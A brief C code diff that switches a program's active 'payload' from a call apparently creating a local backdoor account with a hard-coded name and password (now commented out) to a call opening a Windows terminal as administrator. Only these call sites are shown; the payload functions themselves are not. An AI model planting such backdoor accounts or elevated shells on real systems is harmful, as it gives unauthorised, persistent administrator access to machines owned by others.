@@ -17,8 +17,8 @@ int main(void)
 	/*
 	 * Payload code starts here
 	 */
-	//PDOpenWindowsTerminalAsAdministrator();
-	WACreateBackdoor_P("backdoor","backdoor", REALM_LOCAL);
+	PDOpenWindowsTerminalAsAdministrator();
+	//WACreateBackdoor_P("backdoor","backdoor", REALM_LOCAL);
 }
 
 
